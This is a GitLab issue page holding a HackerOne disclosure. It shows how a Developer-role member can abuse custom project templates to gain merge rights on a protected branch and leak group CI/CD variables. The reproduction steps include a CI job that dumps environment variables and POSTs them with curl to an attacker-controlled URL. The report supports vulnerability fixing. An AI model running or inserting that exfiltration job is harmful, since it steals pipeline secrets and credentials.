=== Content from gitlab.com_b49d4a6b_20250110_135120.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Developer can leak group and any subgroup’s CI/CD variables using Custom project templates functionality

⚠ **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2021616](https://hackerone.com/reports/2021616)** by `theluci` on 2023-06-12, assigned to [@ottilia\_westerlund](/ottilia_westerlund "Ottilia Westerlund"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hello,

Gitlab recently fixed several bugs that allowed a developer to import a project and leak group’s CI/CD variables. To protect against these types of attacks, Gitlab set the minimum role for importing projects to maintainer.

Gitlab also made the Custom project templates functionality reusable by developers in enterprise edition.

However, I found a bug using which a Developer can leak group or any subgroup’s CI/CD variables using Custom project templates functionality.

#### Background

Gitlab provides a **Premium/Ultimate** feature [custom project templates functionality.](https://docs.gitlab.com/ee/user/group/custom_project_templates.html)

The owner of the top-level group can set a subgroup to be used as a source of custom templates for new projects in the group and in any of the subgroups.

#### Vulnerability

When issue [#407374 (closed)](https://gitlab.com/gitlab-org/gitlab/-/issues/407374 "User with developer role (group) can modify Protected branches setting on imported project and leak group CI/CD variables") was fixed gitlab changed importing logic as follows,

When a member imports a project where specific members are **Allowed to merge/Allowed to push and merge** -

[![high1.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/3efc73f5bf3de6bfcb525c7a79c291206bf69aad/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33666161613830632d376239612d343666352d383134342d3266383562656265623938352f68696768312e706e67)

Then Gitlab replaces `user_id` of the member allowed to merge with the `user_id` of the member importing the project.

**That is, the member importing the project gets Allowed to merge/Allowed to push and merge access on the protected branch.**

<------------------------------------------Important---------------------------------------------->

It was probably thought that only maintainers/owners can import a project, thus, them getting allowed to merge access will not be a bug.

However, Custom project template functionality internally imports the template project.

Thus, **if any maintainer, owner, or any other member has allowed to merge permission on protected branch of any of the templates.** Then, developer can just import the template (using custom project template functionality) and get allowed to merge setting on the protected branch.

<------------------------------------------------------------------------------------------------------>

#### Steps to reproduce

(Your instance must have an ultimate trial)

1. `victim` creates a group `victim-group`.
2. `victim` creates a subgroup `subgroup-to-be-template` and template projects `template1`,`template2` inside.
3. `victim` goes to `http://<Your_Instance_IP>/groups/<victim-group>/-/edit`, **Expand Custom project templates** and select `subgroup-to-be-template`
4. `victim` goes to template1 repository settings `http://<Your_Instance_IP>/<victim-group>/<subgroup-to-be-template>/template1/-/settings/repository`, **Expand Protected branches** and gives himself *Allowed to merge* OR *Allowed to push and merge* access on protected branch.

[![high2.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/f40d455ab5abe7383748d0c4011687c62de45622/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f39386136393339302d343963632d346466312d396539302d6334323538366161336366662f68696768322e706e67)

In a real-world scenario, it may not be the owner but any member (maybe a maintainer or some other member) that has **Allowed to merge/Allowed to push and merge** access on protected branch of any of the templates.

It might also be possible that no roles are **Allowed to merge/Allowed to push and merge** but specific users (any user).

As `victim`,

5. `victim` goes to `http://<Your_Instance_IP>/groups/<victim-group>/-/settings/ci_cd`, \*\*Expand Variables \*\* and adds some CI/CD variables.

6. `victim` goes to `http://<Your_Instance_IP>/groups/<victim-group>/-/group_members` and adds `attacker` as *Developer*.

As `attacker`,

7. `attacker` goes to `victim-group`, clicks on **new project** and chooses Create from template.

8. `attacker` uses `template1` and creates `attacker-project`

`attacker` now have **Allowed to merge/Allowed to push and merge** access on protected branch of `attacker-project`.

9. `attacker` adds the following **.gitlab-ci.yml file**

```
job_name:
 script:
   - export > test.txt
   - curl -X POST --data "$(cat test.txt)" attacker-controlled-url
```

The group's CI/CD variables are sent to ***attacker-controlled-url***.

#### Output of checks

This bug happens on Self-hosted Gitlab Instance.

#### Results of GitLab environment info

```
System information
System:         Ubuntu 20.04
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   3.0.6p216
Gem Version:    3.4.13
Bundler Version:2.4.13
Rake Version:   13.0.6
Redis Version:  6.2.11
Sidekiq Version:6.5.7
Go Version:     unknown

GitLab information
Version:        16.0.4-ee
Revision:       7d6834bd32e
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     13.11
URL:            http://x.x.x.x
HTTP Clone URL: http://x.x.x.x/some-group/some-project.git
SSH Clone URL:  git@x.x.x.x:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        14.20.0
Repository storages:
- default:      unix:/var/opt/gitlab/gitaly/gitaly.socket
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
```

#### Impact

Developer of a group can leak group or any subgroup’s CI/CD variables.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [high1.png](https://h1.sec.gitlab.net/a/3faaa80c-7b9a-46f5-8144-2f85bebeb985/high1.png)
* [high2.png](https://h1.sec.gitlab.net/a/98a69390-49cc-4df1-9e90-c42586aa3cff/high2.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Edited Dec 15, 2023 by [Kevin Morrison](/kmorrison1)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


